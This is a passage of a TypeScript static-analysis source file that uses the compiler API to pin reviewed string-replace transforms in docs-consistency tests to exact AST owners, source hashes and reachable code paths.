    !ts.isStringLiteralLike(call.arguments[0]) ||
    call.arguments[0].text !== title
  ) {
    return false;
  }
  const statement = call.parent;
  return (
    ts.isExpressionStatement(statement) &&
    ts.isSourceFile(statement.parent) &&
    isDirectReachableStatement(statement, statement.parent)
  );
}

/** Match a direct live test callback inside one exact top-level describe. */
function isExactDirectTestCallback(
  callback: ts.ArrowFunction | ts.FunctionExpression,
  title: string,
  describeTitle: string
): boolean {
  const call = callback.parent;
  if (
    !ts.isCallExpression(call) ||
    registrationName(call) !== "it" ||
    registrationCallback(call) !== callback ||
    call.arguments[0] === undefined ||
    !ts.isStringLiteralLike(call.arguments[0]) ||
    call.arguments[0].text !== title
  ) {
    return false;
  }
  const statement = call.parent;
  if (!ts.isExpressionStatement(statement) || !ts.isBlock(statement.parent)) return false;
  return (
    isDirectReachableStatement(statement, statement.parent) &&
    isExactDirectDescribeBlock(statement.parent, describeTitle)
  );
}

/** Quote/whitespace transforms must remain the live three-statement normalize arrow. */
function hasExactPdfNormalizationOwner(
  id: ReviewedOrdinaryTransformId,
  declaration: ts.VariableDeclaration,
  sourceFile: ts.SourceFile
): boolean {
  if (id !== "pdf OCR quote normalization" && id !== "pdf OCR whitespace normalization") return false;
  const statement = directVariableStatement(declaration);
  if (statement === null || !ts.isBlock(statement.parent)) return false;
  const normalizeBlock = statement.parent;
  if (normalizeBlock.statements.length !== 3 || !isDirectReachableStatement(statement, normalizeBlock)) return false;
  const quoteDeclaration = directBindingDeclaration(normalizeBlock.statements[0] as ts.Statement, "normalizedQuotes");
  const whitespaceDeclaration = directBindingDeclaration(
    normalizeBlock.statements[1] as ts.Statement,
    "normalizedWhitespace"
  );
  const returnStatement = normalizeBlock.statements[2];
  if (
    quoteDeclaration === null ||
    whitespaceDeclaration === null ||
    (declaration !== quoteDeclaration && declaration !== whitespaceDeclaration) ||
    reviewedTransformCall(quoteDeclaration, "text", "/[\"'`]/g", "", sourceFile) === null ||
    reviewedTransformCall(whitespaceDeclaration, "normalizedQuotes", "/\\s+/g", " ", sourceFile) === null ||
    returnStatement === undefined ||
    !ts.isReturnStatement(returnStatement) ||
    returnStatement.expression === undefined ||
    !ts.isCallExpression(returnStatement.expression) ||
    returnStatement.expression.arguments.length !== 0 ||
    !ts.isPropertyAccessExpression(returnStatement.expression.expression) ||
    returnStatement.expression.expression.name.text !== "toLowerCase" ||
    !ts.isIdentifier(returnStatement.expression.expression.expression) ||
    returnStatement.expression.expression.expression.text !== "normalizedWhitespace" ||
    identifierCount(normalizeBlock, "text") !== 1 ||
    identifierCount(normalizeBlock, "normalizedQuotes") !== 2 ||
    identifierCount(normalizeBlock, "normalizedWhitespace") !== 2
  ) {
    return false;
  }

  const normalizeArrow = normalizeBlock.parent;
  if (
    !ts.isArrowFunction(normalizeArrow) ||
    normalizeArrow.body !== normalizeBlock ||
    normalizeArrow.parameters.length !== 1 ||
    !ts.isIdentifier(normalizeArrow.parameters[0]?.name) ||
    normalizeArrow.parameters[0].name.text !== "text"
  ) {
    return false;
  }
  const normalizeDeclaration = normalizeArrow.parent;
  if (
    !ts.isVariableDeclaration(normalizeDeclaration) ||
    normalizeDeclaration.initializer !== normalizeArrow ||
    !ts.isIdentifier(normalizeDeclaration.name) ||
    normalizeDeclaration.name.text !== "normalize"
  ) {
    return false;
  }
  const normalizeStatement = directVariableStatement(normalizeDeclaration);
  if (normalizeStatement === null || !ts.isBlock(normalizeStatement.parent)) return false;
  const ownerBody = normalizeStatement.parent;
  const owner = ownerBody.parent;
  const readStatement = ownerBody.statements[1];
  const ocrStatement = ownerBody.statements[2];
  if (readStatement === undefined || ocrStatement === undefined) return false;
  const readDeclaration = directBindingDeclaration(readStatement, "read");
  const ocrDeclaration = directBindingDeclaration(ocrStatement, "ocr");
  const isExactNormalizeInvocation = (
    candidate: ts.VariableDeclaration | null,
    argumentName: "readPdf" | "ocrPdf"
  ): boolean =>
    candidate?.initializer !== undefined &&
    ts.isCallExpression(candidate.initializer) &&
    candidate.initializer.arguments.length === 1 &&
    ts.isIdentifier(candidate.initializer.expression) &&
    candidate.initializer.expression.text === "normalize" &&
    ts.isIdentifier(candidate.initializer.arguments[0]) &&
    candidate.initializer.arguments[0].text === argumentName;
  return (
    ts.isFunctionDeclaration(owner) &&
    owner.body === ownerBody &&
    owner.name?.text === "pdfOcrPublicContractProblems" &&
    owner.parameters.length === 2 &&
    ts.isIdentifier(owner.parameters[0]?.name) &&
    owner.parameters[0].name.text === "readPdf" &&
    ts.isIdentifier(owner.parameters[1]?.name) &&
    owner.parameters[1].name.text === "ocrPdf" &&
    ownerBody.statements[0] === normalizeStatement &&
    readDeclaration !== null &&
    ocrDeclaration !== null &&
    isExactNormalizeInvocation(readDeclaration, "readPdf") &&
    isExactNormalizeInvocation(ocrDeclaration, "ocrPdf") &&
    identifierCount(ownerBody, "normalize") === 3 &&
    isDirectReachableStatement(normalizeStatement, ownerBody) &&
    isDirectReachableStatement(readStatement, ownerBody) &&
    isDirectReachableStatement(ocrStatement, ownerBody) &&
    ts.isSourceFile(owner.parent) &&
    isDirectReachableStatement(owner, owner.parent)
  );
}

/** Lifecycle normalization must feed the immediately following contract assertion loop. */
function hasExactLifecycleNormalizationOwner(declaration: ts.VariableDeclaration): boolean {
  const statement = directVariableStatement(declaration);
  if (statement === null || !ts.isBlock(statement.parent)) return false;
  const callbackBody = statement.parent;
  const callback = callbackBody.parent;
  if (
    (!ts.isArrowFunction(callback) && !ts.isFunctionExpression(callback)) ||
    callback.body !== callbackBody ||
    !isExactDirectTestCallback(
      callback,
      "README, ROADMAP, and recipe prompt claims match the actual prompt contract",
      "docs/code consistency — numeric claims (v3.5.1 audit-driven)"
    ) ||
    !isDirectReachableStatement(statement, callbackBody)
  ) {
    return false;
  }
  const statementIndex = callbackBody.statements.indexOf(statement);
  const consumer = callbackBody.statements[statementIndex + 1];
  if (consumer === undefined || !ts.isForOfStatement(consumer) || !ts.isBlock(consumer.statement)) return false;
  const consumerInitializer = consumer.initializer;
  if (!ts.isVariableDeclarationList(consumerInitializer)) return false;
  const contractDeclaration = consumerInitializer.declarations[0];
  if (
    contractDeclaration === undefined ||
    consumerInitializer.declarations.length !== 1 ||
    !ts.isIdentifier(contractDeclaration.name) ||
    contractDeclaration.name.text !== "contract" ||
    !ts.isArrayLiteralExpression(consumer.expression) ||
    consumer.expression.elements.some((element) => !ts.isStringLiteral(element)) ||
    JSON.stringify(
      consumer.expression.elements.map((element) => (ts.isStringLiteral(element) ? element.text : null))
    ) !== JSON.stringify(REVIEWED_LIFECYCLE_CONTRACTS) ||
    consumer.statement.statements.length !== 1 ||
    identifierCount(consumer, "normalizedLifecycle") !== 1 ||
    identifierCount(callbackBody, "normalizedLifecycle") !== 2
  ) {
    return false;
  }
  let exactConsumer = false;
  function visit(node: ts.Node): void {
    if (
      ts.isIdentifier(node) &&
      node.text === "normalizedLifecycle" &&
      ts.isCallExpression(node.parent) &&
      node.parent.arguments[0] === node &&
      ts.isIdentifier(node.parent.expression) &&
      node.parent.expression.text === "expect" &&
      ts.isPropertyAccessExpression(node.parent.parent) &&
      node.parent.parent.expression === node.parent &&
      node.parent.parent.name.text === "toContain" &&
      ts.isCallExpression(node.parent.parent.parent) &&
      node.parent.parent.parent.expression === node.parent.parent &&
      node.parent.parent.parent.arguments.length === 1 &&
      ts.isIdentifier(node.parent.parent.parent.arguments[0]) &&
      node.parent.parent.parent.arguments[0].text === "contract"
    ) {
      exactConsumer = true;
    }
    ts.forEachChild(node, visit);
  }
  visit(consumer);
  if (!exactConsumer) return false;

  const directDeclarations = callbackBody.statements.flatMap((candidate) =>
    ts.isVariableStatement(candidate) ? [...candidate.declarationList.declarations] : []
  );
  const declarationNamed = (name: string): ts.VariableDeclaration | null => {
    const matches = directDeclarations.filter(
      (candidate) => ts.isIdentifier(candidate.name) && candidate.name.text === name
    );
    return matches.length === 1 ? (matches[0] ?? null) : null;
  };
  const recipesDeclaration = declarationNamed("recipes");
  const lifecycleMatchDeclaration = declarationNamed("lifecycleMatch");
  const lifecycleDeclaration = declarationNamed("lifecycle");
  if (
    recipesDeclaration === null ||
    lifecycleMatchDeclaration === null ||
    lifecycleDeclaration === null ||
    !isDirectConstDeclaration(recipesDeclaration) ||
    !isDirectConstDeclaration(lifecycleMatchDeclaration) ||
    !isDirectConstDeclaration(lifecycleDeclaration)
  ) {
    return false;
  }
  const recipesStatement = directVariableStatement(recipesDeclaration);
  const lifecycleMatchStatement = directVariableStatement(lifecycleMatchDeclaration);
  const lifecycleStatement = directVariableStatement(lifecycleDeclaration);
  if (recipesStatement === null || lifecycleMatchStatement === null || lifecycleStatement === null) return false;
  const recipesIndex = callbackBody.statements.indexOf(recipesStatement);
  const lifecycleMatchIndex = callbackBody.statements.indexOf(lifecycleMatchStatement);
  const lifecycleIndex = callbackBody.statements.indexOf(lifecycleStatement);
  if (
    lifecycleMatchIndex !== recipesIndex + 1 ||
    lifecycleIndex !== lifecycleMatchIndex + 2 ||
    lifecycleIndex >= statementIndex ||
    !isDirectReachableStatement(recipesStatement, callbackBody) ||
    !isDirectReachableStatement(lifecycleMatchStatement, callbackBody) ||
    !isDirectReachableStatement(lifecycleStatement, callbackBody)
  ) {
    return false;
  }

  const recipesInitializer = recipesDeclaration.initializer;
  const recipesReadCall =
    recipesInitializer !== undefined && ts.isAwaitExpression(recipesInitializer) ? recipesInitializer.expression : null;
  const lifecycleMatchInitializer = lifecycleMatchDeclaration.initializer;
  const lifecycleInitializer = lifecycleDeclaration.initializer;
  if (
    recipesReadCall === null ||
    !ts.isCallExpression(recipesReadCall) ||
    recipesReadCall.arguments.length !== 1 ||
    !ts.isIdentifier(recipesReadCall.expression) ||
    recipesReadCall.expression.text !== "read" ||
    !ts.isStringLiteral(recipesReadCall.arguments[0]) ||
    recipesReadCall.arguments[0].text !== "examples/README.md" ||
    lifecycleMatchInitializer === undefined ||
    !ts.isCallExpression(lifecycleMatchInitializer) ||
    lifecycleMatchInitializer.arguments.length !== 1 ||
    !ts.isIdentifier(lifecycleMatchInitializer.arguments[0]) ||
    lifecycleMatchInitializer.arguments[0].text !== "recipes" ||
    !ts.isPropertyAccessExpression(lifecycleMatchInitializer.expression) ||
    lifecycleMatchInitializer.expression.name.text !== "exec" ||
    !ts.isRegularExpressionLiteral(lifecycleMatchInitializer.expression.expression) ||
    lifecycleMatchInitializer.expression.expression.getText() !==
      "/## Agent lifecycle recipes([\\s\\S]*?)(?=\\n## )/" ||
    lifecycleInitializer === undefined ||
    !ts.isBinaryExpression(lifecycleInitializer) ||
    lifecycleInitializer.operatorToken.kind !== ts.SyntaxKind.QuestionQuestionToken ||
    !ts.isElementAccessExpression(lifecycleInitializer.left) ||
    lifecycleInitializer.left.questionDotToken === undefined ||
    !ts.isIdentifier(lifecycleInitializer.left.expression) ||
    lifecycleInitializer.left.expression.text !== "lifecycleMatch" ||
    lifecycleInitializer.left.argumentExpression === undefined ||
    !ts.isNumericLiteral(lifecycleInitializer.left.argumentExpression) ||
    lifecycleInitializer.left.argumentExpression.text !== "1" ||
    !ts.isStringLiteral(lifecycleInitializer.right) ||
    lifecycleInitializer.right.text !== ""
  ) {
    return false;
  }

  const recipesReferences = identifiersNamed(callbackBody, "recipes");
  const lifecycleMatchReferences = identifiersNamed(callbackBody, "lifecycleMatch");
  const lifecycleReferences = identifiersNamed(callbackBody, "lifecycle");
  const lifecycleDirectExpectArguments = lifecycleReferences.filter(
    (identifier) =>
      ts.isCallExpression(identifier.parent) &&
      identifier.parent.arguments[0] === identifier &&
      ts.isIdentifier(identifier.parent.expression) &&
      identifier.parent.expression.text === "expect"
  );
  const lifecycleOverclaimArguments = lifecycleReferences.filter(
    (identifier) =>
      ts.isCallExpression(identifier.parent) &&
      identifier.parent.arguments[0] === identifier &&
      ts.isIdentifier(identifier.parent.expression) &&
      identifier.parent.expression.text === "findRecipeOverclaim"
  );
  const lifecycleReplaceReceivers = lifecycleReferences.filter(
    (identifier) =>
      ts.isPropertyAccessExpression(identifier.parent) &&
      identifier.parent.expression === identifier &&
      identifier.parent.name.text === "replace"
  );
  return (
    recipesReferences.length === 2 &&
    recipesReferences.includes(recipesDeclaration.name as ts.Identifier) &&
    recipesReferences.includes(lifecycleMatchInitializer.arguments[0] as ts.Identifier) &&
    lifecycleMatchReferences.length === 3 &&
    lifecycleMatchReferences.includes(lifecycleMatchDeclaration.name as ts.Identifier) &&
    lifecycleMatchReferences.includes(lifecycleInitializer.left.expression as ts.Identifier) &&
    lifecycleMatchReferences.some(
      (identifier) =>
        ts.isCallExpression(identifier.parent) &&
        identifier.parent.arguments[0] === identifier &&
        ts.isIdentifier(identifier.parent.expression) &&
        identifier.parent.expression.text === "expect"
    ) &&
    lifecycleReferences.length === 5 &&
    lifecycleReferences.includes(lifecycleDeclaration.name as ts.Identifier) &&
    lifecycleDirectExpectArguments.length === 2 &&
    lifecycleOverclaimArguments.length === 1 &&
    lifecycleReplaceReceivers.length === 1
  );
}

/** Gate unescape must be the live local consumed by the immediately following return. */
function hasExactGateUnescapeOwner(declaration: ts.VariableDeclaration): boolean {
  const statement = directVariableStatement(declaration);
  if (statement === null || !ts.isBlock(statement.parent)) return false;
  const mapBody = statement.parent;
  const returnStatement = mapBody.statements[1];
  if (
    mapBody.statements.length !== 2 ||
    mapBody.statements[0] !== statement ||
    !isDirectReachableStatement(statement, mapBody) ||
    returnStatement === undefined ||
    !ts.isReturnStatement(returnStatement) ||
    returnStatement.expression === undefined ||
    !ts.isIdentifier(returnStatement.expression) ||
    returnStatement.expression.text !== "unescapedGate" ||
    identifierCount(mapBody, "gate") !== 1 ||
    identifierCount(mapBody, "unescapedGate") !== 2
  ) {
    return false;
  }
  const mapCallback = mapBody.parent;
  if (
    !ts.isArrowFunction(mapCallback) ||
    mapCallback.body !== mapBody ||
    mapCallback.parameters.length !== 1 ||
    !ts.isIdentifier(mapCallback.parameters[0]?.name) ||
    mapCallback.parameters[0].name.text !== "gate"
  ) {
    return false;
  }
  const mapCall = mapCallback.parent;
  if (
    !ts.isCallExpression(mapCall) ||
    mapCall.arguments.length !== 1 ||
    mapCall.arguments[0] !== mapCallback ||
    !ts.isPropertyAccessExpression(mapCall.expression) ||
    mapCall.expression.name.text !== "map" ||
    !ts.isReturnStatement(mapCall.parent) ||
    mapCall.parent.expression !== mapCall ||
    !ts.isBlock(mapCall.parent.parent)
  ) {
    return false;
  }
  const splitCall = mapCall.expression.expression;
  if (
    !ts.isCallExpression(splitCall) ||
    splitCall.arguments.length !== 1 ||
    !ts.isStringLiteral(splitCall.arguments[0]) ||
    splitCall.arguments[0].text !== "|" ||
    !ts.isPropertyAccessExpression(splitCall.expression) ||
    splitCall.expression.name.text !== "split"
  ) {
    return false;
  }
  const splitReceiver = unwrapStaticExpression(splitCall.expression.expression);
  if (
    !ts.isBinaryExpression(splitReceiver) ||
    splitReceiver.operatorToken.kind !== ts.SyntaxKind.QuestionQuestionToken ||
    !ts.isElementAccessExpression(splitReceiver.left) ||
    !ts.isIdentifier(splitReceiver.left.expression) ||
    splitReceiver.left.expression.text !== "m" ||
    splitReceiver.left.argumentExpression === undefined ||
    !ts.isNumericLiteral(splitReceiver.left.argumentExpression) ||
    splitReceiver.left.argumentExpression.text !== "1" ||
    !ts.isStringLiteral(splitReceiver.right) ||
    splitReceiver.right.text !== ""
  ) {
    return false;
  }
  const ownerBody = mapCall.parent.parent;
  const owner = ownerBody.parent;
  const releaseYmlStatement = ownerBody.statements[0];
  const matchStatement = ownerBody.statements[1];
  const matchGuard = ownerBody.statements[2];
  const returnOwnerStatement = ownerBody.statements[3];
  if (
    ownerBody.statements.length !== 4 ||
    releaseYmlStatement === undefined ||
    matchStatement === undefined ||
    matchGuard === undefined ||
    returnOwnerStatement === undefined ||
    returnOwnerStatement !== mapCall.parent
  ) {
    return false;
  }
  const releaseYmlDeclaration = directBindingDeclaration(releaseYmlStatement, "releaseYml");
  const matchDeclaration = directBindingDeclaration(matchStatement, "m");
  const releaseYmlInitializer = releaseYmlDeclaration?.initializer;
  const readCall =
    releaseYmlInitializer !== undefined && ts.isAwaitExpression(releaseYmlInitializer)
      ? releaseYmlInitializer.expression
      : null;
  const matchInitializer = matchDeclaration?.initializer;
  if (
    readCall === null ||
    !ts.isCallExpression(readCall) ||
    readCall.arguments.length !== 1 ||
    !ts.isIdentifier(readCall.expression) ||
    readCall.expression.text !== "read" ||
    !ts.isStringLiteral(readCall.arguments[0]) ||
    readCall.arguments[0].text !== ".github/workflows/release.yml" ||
    matchInitializer === undefined ||
    !ts.isCallExpression(matchInitializer) ||
    matchInitializer.arguments.length !== 1 ||
    !ts.isIdentifier(matchInitializer.arguments[0]) ||
    matchInitializer.arguments[0].text !== "releaseYml" ||
    !ts.isPropertyAccessExpression(matchInitializer.expression) ||
    matchInitializer.expression.name.text !== "exec" ||
    !ts.isRegularExpressionLiteral(matchInitializer.expression.expression) ||
    matchInitializer.expression.expression.getText() !== '/REQUIRED="([^"]+)"/' ||
    !ts.isIfStatement(matchGuard) ||
    matchGuard.elseStatement !== undefined ||
    !ts.isPrefixUnaryExpression(matchGuard.expression) ||
    matchGuard.expression.operator !== ts.SyntaxKind.ExclamationToken ||
    !ts.isIdentifier(matchGuard.expression.operand) ||
    matchGuard.expression.operand.text !== "m" ||
    !ts.isThrowStatement(matchGuard.thenStatement) ||
    identifierCount(ownerBody, "releaseYml") !== 2 ||
    identifierCount(ownerBody, "m") !== 3
  ) {
    return false;
  }
  if (
    !ts.isFunctionDeclaration(owner) ||
    owner.body !== ownerBody ||
    owner.name?.text !== "requiredCiGates" ||
    owner.parameters.length !== 0 ||
    !isDirectReachableStatement(releaseYmlStatement, ownerBody) ||
    !isDirectReachableStatement(matchStatement, ownerBody) ||
    !isDirectReachableStatement(matchGuard, ownerBody) ||
    !isDirectReachableStatement(returnOwnerStatement, ownerBody) ||
    !ts.isBlock(owner.parent) ||
    !isDirectReachableStatement(owner, owner.parent)
  ) {
    return false;
  }
  return isExactDirectDescribeBlock(
    owner.parent,
    "docs/code consistency — AI-agent text surfaces + AGENTS.md numeric claims"
  );
}

/** Bind each reviewed tuple to its exact live owner and consumer. */
function hasExactReviewedTransformOwner(
  id: ReviewedOrdinaryTransformId,
  declaration: ts.VariableDeclaration,
  sourceFile: ts.SourceFile
): boolean {
  if (id === "pdf OCR quote normalization" || id === "pdf OCR whitespace normalization") {
    return hasExactPdfNormalizationOwner(id, declaration, sourceFile);
  }
  if (id === "lifecycle whitespace normalization") return hasExactLifecycleNormalizationOwner(declaration);
  return hasExactGateUnescapeOwner(declaration);
}

/** Return the leftmost identifier that owns one fluent receiver expression. */
function expressionReceiverRoot(expression: ts.Expression): string | null {
  const current = unwrapStaticExpression(expression);
  if (ts.isIdentifier(current)) return current.text;
  if (ts.isCallExpression(current)) return expressionReceiverRoot(current.expression);
  if (ts.isPropertyAccessExpression(current) || ts.isElementAccessExpression(current)) {
    return expressionReceiverRoot(current.expression);
  }
  return null;
}

interface OrdinaryTransformOwner {
  readonly id: string;
  readonly node: ts.FunctionLikeDeclaration;
}

/** Bind a reviewed ordinary transform to one named helper or exact test case. */
function ordinaryTransformOwner(node: ts.Node): OrdinaryTransformOwner | null {
  let current: ts.Node | undefined = node;
  while (current !== undefined) {
    if (ts.isFunctionDeclaration(current) && current.name !== undefined) {
      return { id: `function:${current.name.text}`, node: current };
    }
    if (ts.isMethodDeclaration(current) && ts.isIdentifier(current.name)) {
      return { id: `function:${current.name.text}`, node: current };
    }
    if (ts.isArrowFunction(current) || ts.isFunctionExpression(current)) {
      if (ts.isVariableDeclaration(current.parent) && ts.isIdentifier(current.parent.name)) {
        return { id: `function:${current.parent.name.text}`, node: current };
      }
      const call = current.parent;
      if (ts.isCallExpression(call) && call.arguments.includes(current)) {
        const root = expressionReceiverRoot(call.expression);
        const title = call.arguments[0];
        if (
          (root === "it" || root === "test") &&
          title !== undefined &&
          ts.isStringLiteralLike(title)
        ) {
          return { id: `test:${title.text}`, node: current };
        }
      }
    }
    current = current.parent;
  }
  return null;
}

/** Freeze one owner by semantic label, physical site, and complete AST text. */
function sourceOwnerSha256(id: string, node: ts.Node, sourceFile: ts.SourceFile): string {
  return sha256Text(
    JSON.stringify({
      id,
      source: ts.isSourceFile(node) ? node.getFullText() : node.getText(sourceFile),
      start: node.getStart(sourceFile)
    })
  );
}

function ordinaryTransformOwnerSha256(owner: OrdinaryTransformOwner, sourceFile: ts.SourceFile): string {
  return sourceOwnerSha256(owner.id, sourceFile, sourceFile);
}

interface MutationHelperCallOwner {
  readonly id: string;
  readonly node: ts.Node;
}

/** Return the nearest executable owner for one exact mutation-helper call. */
function mutationHelperCallOwner(node: ts.Node): MutationHelperCallOwner {
  let current: ts.Node | undefined = node;
  let nearestStatement: ts.Statement | null = null;
  while (current !== undefined) {
    if (ts.isStatement(current) && nearestStatement === null) nearestStatement = current;
    if (ts.isFunctionDeclaration(current) && current.name !== undefined) {
      return { id: `function:${current.name.text}`, node: current };
    }
    if (ts.isMethodDeclaration(current) && ts.isIdentifier(current.name)) {
      return { id: `function:${current.name.text}`, node: current };
    }
    if (ts.isArrowFunction(current) || ts.isFunctionExpression(current)) {
      if (ts.isVariableDeclaration(current.parent) && ts.isIdentifier(current.parent.name)) {
        return { id: `function:${current.parent.name.text}`, node: current };
      }
      const call = current.parent;
      if (ts.isCallExpression(call) && call.arguments.includes(current)) {
        const root = expressionReceiverRoot(call.expression) ?? "call";
        const title = call.arguments.find((argument) => ts.isStringLiteralLike(argument));
        return {
          id: title !== undefined && ts.isStringLiteralLike(title) ? `${root}:${title.text}` : `callback:${root}`,
          node: current
        };
      }
      return { id: "anonymous-function", node: current };
    }
    current = current.parent;
  }
  return { id: "source-statement", node: nearestStatement ?? node.getSourceFile() };
}

/** Return the complete top-level executable statement that contains one call. */
function topLevelExecutableOwner(node: ts.Node, sourceFile: ts.SourceFile): ts.Node {
  let current = node;
  while (current.parent !== undefined && current.parent !== sourceFile) current = current.parent;
  return current.parent === sourceFile ? current : sourceFile;
}

/** Reject obvious dead-code relocation from a reviewed call through its source root. */
function isObviouslyReachableWithinSource(node: ts.Node, sourceFile: ts.SourceFile): boolean {
  let current = node;
  while (current !== sourceFile) {
    const parent = current.parent;
    if (parent === undefined) return false;
    if ((ts.isBlock(parent) || ts.isSourceFile(parent)) && ts.isStatement(current)) {
      if (!isDirectReachableStatement(current, parent)) return false;
    }
    if (ts.isIfStatement(parent)) {
      if (current === parent.thenStatement && isLiteralBoolean(parent.expression, false)) return false;
      if (current === parent.elseStatement && isLiteralBoolean(parent.expression, true)) return false;
    }
    if (ts.isConditionalExpression(parent)) {
      if (current === parent.whenTrue && isLiteralBoolean(parent.condition, false)) return false;
      if (current === parent.whenFalse && isLiteralBoolean(parent.condition, true)) return false;
    }
    if (ts.isWhileStatement(parent) && current === parent.statement && isLiteralBoolean(parent.expression, false)) {
      return false;
    }
    if (
      ts.isForStatement(parent) &&
      current === parent.statement &&
      parent.condition !== undefined &&
      isLiteralBoolean(parent.condition, false)
    ) {
      return false;
    }
    current = parent;
  }
  return true;
}

/** Recognize each reviewed non-mutation transform by exact file and AST identity. */
function reviewedOrdinaryTransformId(
  filename: string,
  node: ts.PropertyAccessExpression,
  sourceFile: ts.SourceFile
): ReviewedOrdinaryTransformId | null {
  if (node.name.text !== "replace" && node.name.text !== "replaceAll") return null;
  const call = node.parent;
  if (!ts.isCallExpression(call) || call.expression !== node || call.arguments.length !== 2) return null;
  const pattern = call.arguments[0];
  const replacement = call.arguments[1];
  const receiverRoot = expressionReceiverRoot(node.expression);
  const owner = ordinaryTransformOwner(call);
  if (pattern === undefined || replacement === undefined || receiverRoot === null) return null;

  const reviewed = REVIEWED_ORDINARY_TRANSFORMS.find(
    (candidate) =>
      candidate.filename === filename &&
      candidate.method === node.name.text &&
      owner !== null &&
      candidate.owner === owner.id &&
      EXPECTED_REVIEWED_ORDINARY_OWNER_SHA256.get(candidate.id) ===
        ordinaryTransformOwnerSha256(owner, sourceFile) &&
      isObviouslyReachableWithinSource(call, sourceFile) &&
      candidate.receiverRoot === receiverRoot &&
      candidate.pattern === pattern.getText(sourceFile) &&
      candidate.replacement === replacement.getText(sourceFile)
  );
  if (reviewed === undefined) return null;
  if (filename !== "docs-consistency.test.ts") return reviewed.id;

  const declaration = call.parent;
  if (
    !("binding" in reviewed) ||
    !ts.isVariableDeclaration(declaration) ||
    declaration.initializer !== call ||
    !ts.isIdentifier(declaration.name) ||
    declaration.name.text !== reviewed.binding ||
    !hasExactReviewedTransformOwner(reviewed.id, declaration, sourceFile)
  ) {
    return null;
  }
  return reviewed.id;
}

type ForbiddenReplaceMethod = "replace" | "replaceAll";

interface StaticStringResolution {
  readonly hasUnknown: boolean;
  readonly values: ReadonlySet<string>;
}

interface ComputedMethodResolver {
  readonly resolve: (expression: ts.Expression | undefined) => StaticStringResolution;
}

/** True when a symbol has at least one declaration that survives TypeScript emit. */
function symbolHasRuntimeValueBinding(symbol: ts.Symbol): boolean {
  return (symbol.declarations ?? []).some((declaration) => {
    if (
      ts.isInterfaceDeclaration(declaration) ||
      ts.isTypeAliasDeclaration(declaration) ||
      ts.isTypeParameterDeclaration(declaration)
    ) {
      return false;
    }
    let current: ts.Node | undefined = declaration;
    while (current !== undefined && !ts.isSourceFile(current)) {
      if (
        ts.canHaveModifiers(current) &&
        ts.getModifiers(current)?.some((modifier) => modifier.kind === ts.SyntaxKind.DeclareKeyword)
      ) {
        return false;
      }
      if (ts.isImportSpecifier(current) && current.isTypeOnly) return false;
      if (ts.isImportClause(current) && current.isTypeOnly) return false;
      if (ts.isImportEqualsDeclaration(current) && current.isTypeOnly) return false;
      current = current.parent;
    }
    return !declaration.getSourceFile().isDeclarationFile;
  });
}

/**
 * Resolve computed-property strings by lexical symbol identity.
 * Only one direct `const` initializer is followed, so a same-spelled shadow or
 * mutable binding cannot contaminate an unrelated scope.
 */
function computedMethodResolver(checker: ts.TypeChecker): ComputedMethodResolver {
  const unknownResolution = (): StaticStringResolution => ({ hasUnknown: true, values: new Set() });
  const knownResolution = (value: string): StaticStringResolution => ({ hasUnknown: false, values: new Set([value]) });
  const mergeResolutions = (...resolutions: readonly StaticStringResolution[]): StaticStringResolution => ({
    hasUnknown: resolutions.some((resolution) => resolution.hasUnknown),
    values: new Set(resolutions.flatMap((resolution) => [...resolution.values]))
  });

  function resolve(
    expression: ts.Expression | undefined,
    resolving: ReadonlySet<ts.Symbol> = new Set()
  ): StaticStringResolution {
    if (expression === undefined) return unknownResolution();
    const current = unwrapStaticExpression(expression);
    const literal = staticStringExpressionText(current);
    if (literal !== null) return knownResolution(literal);
    if (ts.isPropertyAccessExpression(current) || ts.isElementAccessExpression(current)) {
      const owner = unwrapStaticExpression(current.expression);
      const ownerSymbol = ts.isIdentifier(owner) ? checker.getSymbolAtLocation(owner) : undefined;
      const member = ts.isPropertyAccessExpression(current)
        ? current.name.text
        : staticStringExpressionText(current.argumentExpression ?? current);
      if (
        ts.isIdentifier(owner) &&
        owner.text === "Symbol" &&
        (ownerSymbol === undefined || !symbolHasRuntimeValueBinding(ownerSymbol)) &&
        member === "iterator"
      ) {
        return knownResolution("@@Symbol.iterator");
      }
    }
    if (ts.isConditionalExpression(current)) {
      return mergeResolutions(resolve(current.whenTrue, resolving), resolve(current.whenFalse, resolving));
    }
    if (!ts.isIdentifier(current)) return unknownResolution();
    const symbol = checker.getSymbolAtLocation(current);
    if (symbol === undefined || resolving.has(symbol)) return unknownResolution();
    const declarations = symbol.declarations ?? [];
    if (declarations.length !== 1) return unknownResolution();
    const declaration = declarations[0];
    if (
      declaration === undefined ||
      !ts.isVariableDeclaration(declaration) ||
      !ts.isIdentifier(declaration.name) ||
      declaration.initializer === undefined ||
      !ts.isVariableDeclarationList(declaration.parent) ||
      (declaration.parent.flags & ts.NodeFlags.Const) === 0
    ) {
      return unknownResolution();
    }
    return resolve(declaration.initializer, new Set([...resolving, symbol]));
  }
  return { resolve };
}

/** Resolve a computed property only when its spelling or const alias is statically reviewed. */
function computedMethodText(
  expression: ts.Expression | undefined,
  resolver: ComputedMethodResolver
): ForbiddenReplaceMethod | null {
  const resolution = resolver.resolve(expression);
  if (resolution.values.has("replace")) return "replace";
  return resolution.values.has("replaceAll") ? "replaceAll" : null;
}

/** A known-safe computed string is not dynamic merely because it is not a replace spelling. */
function isUnresolvedComputedMethod(
  expression: ts.Expression | undefined,
  resolver: ComputedMethodResolver
): boolean {
  return resolver.resolve(expression).hasUnknown;
}

/** Assignment forms whose result can preserve a direct aliased value. */
function isAliasAssignmentToken(kind: ts.SyntaxKind): boolean {
  return (
    kind === ts.SyntaxKind.EqualsToken ||
    kind === ts.SyntaxKind.AmpersandAmpersandEqualsToken ||
    kind === ts.SyntaxKind.BarBarEqualsToken ||
    kind === ts.SyntaxKind.QuestionQuestionEqualsToken
  );
}

/** Logical binary forms whose runtime result is one of their two operands. */
function isLogicalValueToken(kind: ts.SyntaxKind): boolean {
  return (
    kind === ts.SyntaxKind.AmpersandAmpersandToken ||
    kind === ts.SyntaxKind.BarBarToken ||
    kind === ts.SyntaxKind.QuestionQuestionToken
  );
}

interface FlatAssignmentTarget {
  readonly fallback?: ts.Expression;
  readonly target: ts.Identifier;
}

/** Resolve the identifier and optional default written by one flat assignment-pattern property. */
function flatAssignmentTarget(expression: ts.Expression): FlatAssignmentTarget | null {
  const current = unwrapStaticExpression(expression);
  if (ts.isIdentifier(current)) return { target: current };
  if (ts.isBinaryExpression(current) && current.operatorToken.kind === ts.SyntaxKind.EqualsToken) {
    const target = unwrapStaticExpression(current.left);
    return ts.isIdentifier(target) ? { fallback: current.right, target } : null;
  }
  return null;
}

